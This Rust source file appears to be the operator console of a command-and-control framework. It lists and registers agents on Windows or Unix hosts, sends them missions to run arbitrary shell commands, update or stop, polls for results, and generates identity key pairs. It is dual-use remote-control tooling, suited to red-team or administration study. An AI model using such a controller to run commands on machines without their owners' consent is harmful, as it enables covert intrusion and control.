use std::fs;

use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{crypto, model};
use thiserror::Error;

#[derive(Error, Debug)]
enum ClientError {
    #[error("dialoguer error: {0}")]
    Dialoguer(#[from] dialoguer::Error),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("ureq error: {0}")]
    Ureq(#[from] ureq::Error),
    #[error("serde_json error: {0}")]
    SerdeJson(#[from] serde_json::Error),
}

type ClientResult<T> = Result<T, ClientError>;

fn list_agents() -> ClientResult<Vec<model::Agent>> {
    let agents: Vec<model::Agent> = ureq::get("http://localhost:3000/agents")
        .call()?
        .into_json()?;
    Ok(agents)
}

fn issue_mission(agent_id: i32, task: model::Task) -> ClientResult<model::Mission> {
    // let f = fs::File::open("target/debug/agent")?;
    // let metadata = f.metadata()?;
    // println!("metadata len: {:?}", metadata.len());
    let mission: model::Mission = ureq::post("http://localhost:3000/missions")
        // .set("Content-Length", &metadata.len().to_string())
        .send_json(serde_json::to_value(&model::Mission {
            id: Default::default(),
            agent_id,
            task,
            result: None,
            issued_at: Default::default(),
            completed_at: None,
        })?)?
        .into_json()?;
    Ok(mission)
}

fn get_mission_result(mission_id: i32) -> ClientResult<Option<String>> {
    let response = ureq::get(&format!("http://localhost:3000/missions/{mission_id}")).call()?;
    if response.status() == 204 {
        Ok(None)
    } else {
        let result: Option<String> = response.into_json()?;
        Ok(result)
    }
}

fn prompt(prompt: &str) -> Result<String, dialoguer::Error> {
    dialoguer::Input::new()
        .with_prompt(prompt)
        .interact_text()
        .map(|s: String| s.trim().to_string())
}

fn select_agent(agents: &[model::Agent]) -> ClientResult<Option<&model::Agent>> {
    Ok(
        dialoguer::FuzzySelect::with_theme(&dialoguer::theme::ColorfulTheme::default())
            .with_prompt("Select an agent")
            .default(0)
            .items(&agents.iter().map(agent_fmt).collect::<Vec<_>>())
            .interact_opt()?
            .and_then(|i| agents.get(i)),
    )
}

fn agent_fmt(agent: &model::Agent) -> String {
    format!(
        "{} [{}]: {}",
        agent.id,
        if agent.platform == model::Platform::Unix {
            "UNX"
        } else {
            "WIN"
        },
        agent.name
    )
}

// TODO Make a menu system
// 1. Select context of an agent
// 2. CRUD + issue mission
fn main() -> ClientResult<()> {
    loop {
        let selection =
            dialoguer::FuzzySelect::with_theme(&dialoguer::theme::ColorfulTheme::default())
                .with_prompt("Select a subcommand")
                .default(0)
                .items(&[
                    "Issue mission",
                    "List agents",
                    "Create agent",
                    "Update agent name",
                    "Generate identity key pair",
                    "Exit",
                ])
                .interact_opt()?;

        if let Some(selection) = selection {
            match selection {
                0 => {
                    let agents = list_agents()?;

                    let Some(agent) = select_agent(&agents)? else {
                        println!("No agent selected");
                        continue;
                    };

                    let Some(task) = dialoguer::FuzzySelect::with_theme(
                        &dialoguer::theme::ColorfulTheme::default(),
                    )
                    .with_prompt("Select a task")
                    .default(0)
                    .items(&["Execute", "Update", "Stop"])
                    .interact_opt()?
                    .and_then(|selection| match selection {
                        0 => Some(model::Task::Execute(prompt("Command").unwrap())),
                        1 => {
                            // let agent_bin = fs::read("target/debug/agent").unwrap();
                            // Some(api::Task::Update(agent_bin))
                            Some(model::Task::Update(vec![]))
                        }
                        2 => Some(model::Task::Stop),
                        _ => unreachable!(),
                    }) else {
                        println!("No task selected");
                        continue;
                    };

                    let mission = issue_mission(agent.id, task)?;
                    loop {
                        match get_mission_result(mission.id) {
                            Ok(Some(result)) => {
                                println!("{result}");
                                break;
                            }
                            Err(e) => eprintln!("{e}"),
                            _ => {}
                        }
                        std::thread::sleep(std::time::Duration::from_secs(1));
                    }
                }
                1 => {
                    for agent in list_agents()? {
                        println!("\t{}", agent_fmt(&agent));
                    }
                }
                2 => {
                    let Some(platform) = dialoguer::Select::new()
                        .with_prompt("Select platform")
                        .default(0)
                        .items(&["Windows", "Unix"])
                        .interact_opt()?
                        .and_then(|platform| {
                            Some(match platform {
                                0 => model::Platform::Windows,
                                1 => model::Platform::Unix,
                                _ => unreachable!(),
                            })
                        })
                    else {
                        println!("No platform selected");
                        continue;
                    };

                    let response =
                        ureq::post("http://localhost:3000/agents").send_json(model::Agent {
                            id: Default::default(),
                            name: prompt("Agent name")?,
                            identity: crypto::VerifyingKey::from_bytes(
                                fs::read(prompt("Agent identity public key file path")?)?
                                    .as_slice()
                                    .try_into()
                                    .unwrap(),
                            )
                            .unwrap()
                            .to_bytes(),
                            platform,
                            created_at: Default::default(),
                            last_seen_at: Default::default(),
                        })?;

                    if response.status() == 201 {
                        println!("Agent created");
                    } else {
                        eprintln!("Failed to create agent");
                    }
                }
                3 => {
                    let agents = list_agents()?;

                    let Some(agent) = select_agent(&agents)? else {
                        println!("No agent selected");
                        continue;
                    };

                    let name = prompt("New name")?;

                    let response = ureq::put(&format!("http://localhost:3000/agents/{}", agent.id))
                        .send_json(model::Agent {
                            name,
                            ..agent.clone()
                        })?;

                    if response.status() == 200 {
                        println!("Agent name updated");
                    } else {
                        eprintln!("Failed to update agent name");
                    }
                }
                4 => {
                    let signing_key = crypto::get_signing_key();
                    println!(
                        "[+] Signing key: {:?}",
                        BASE64_STANDARD.encode(signing_key.as_bytes())
                    );
                    println!(
                        "[+] Verifying key: {:?}",
                        BASE64_STANDARD.encode(signing_key.verifying_key().as_bytes())
                    );
                }
                5 => break,
                _ => unreachable!(),
            }
        }
    }
    println!("Bye :)");
    Ok(())
}

/*
struct Action<T> {
    pub name: String,
    pub action: fn() -> T,
}

struct Actions<T> {
    pub actions: Vec<Action<T>>,
}

impl<T> From<Vec<Action<T>>> for Actions<T> {
    fn from(value: Vec<Action<T>>) -> Self {
        Self { actions: value }
    }
}

impl<T> Actions<T> {
    pub fn select(&self, prompt: &str) -> ClientResult<Option<T>> {
        Ok(
            dialoguer::FuzzySelect::with_theme(&dialoguer::theme::ColorfulTheme::default())
                .with_prompt(prompt)
                .default(0)
                .items(&self.actions.iter().map(|a| &a.name).collect::<Vec<_>>())
                .interact_opt()?
                .and_then(|i| {
                    self.actions
                        .get(i)
                        .and_then(|action| Some((action.action)()))
                }),
        )
    }
}

let actions = vec![
        Action {
            name: "Issue mission".to_string(),
            action: || {
                let agents = list_agents()?;

                let Some(agent) = select_agent(&agents)? else {
                    println!("No agent selected");
                    return;
                };

                let Some(task) = dialoguer::FuzzySelect::with_theme(
                    &dialoguer::theme::ColorfulTheme::default(),
                )
                .with_prompt("Select a task")
                .default(0)
                .items(&["Execute", "Update", "Stop"])
                .interact_opt()?
                .and_then(|selection| match selection {
                    0 => Some(model::Task::Execute(prompt("Command").unwrap())),
                    1 => {
                        // let agent_bin = fs::read("target/debug/agent").unwrap();
                        // Some(api::Task::Update(agent_bin))
                        Some(model::Task::Update(vec![]))
                    }
                    2 => Some(model::Task::Stop),
                    _ => unreachable!(),
                }) else {
                    println!("No task selected");
                    return;
                };

                let mission = issue_mission(agent.id, task)?;
                loop {
                    match get_mission_result(mission.id) {
                        Ok(Some(result)) => {
                            println!("{result}");
                            break;
                        }
                        Err(e) => eprintln!("{e}"),
                        _ => {}
                    }
                    std::thread::sleep(std::time::Duration::from_secs(1));
                }
            },
        },
        Action {
            name: "List agents".to_string(),
            action: || {
                for agent in list_agents()? {
                    println!("\t{}", agent_fmt(&agent));
                }
            },
        },
        Action {
            name: "Update agent name".to_string(),
            action: || {
                let agents = list_agents()?;

                let Some(agent) = select_agent(&agents)? else {
                    println!("No agent selected");
                    return;
                };

                let name = prompt("New name")?;

                let response = ureq::put(&format!("http://localhost:3000/agents/{}", agent.id))
                    .send_json(model::Agent {
                        name,
                        ..agent.clone()
                    })?;

                if response.status() == 200 {
                    println!("Agent name updated");
                } else {
                    eprintln!("Failed to update agent name");
                }
            },
        },
        Action {
            name: "Generate identity key pair".to_string(),
            action: || {
                let signing_key = crypto::get_signing_key();
                println!(
                    "[+] Signing key: {:?}",
                    BASE64_STANDARD.encode(signing_key.as_bytes())
                );
                println!(
                    "[+] Verifying key: {:?}",
                    BASE64_STANDARD.encode(signing_key.verifying_key().as_bytes())
                );
            },
        },
        Action {
            name: "Exit".to_string(),
            action: || {
                std::process::exit(0);
            },
        },
    ];
*/
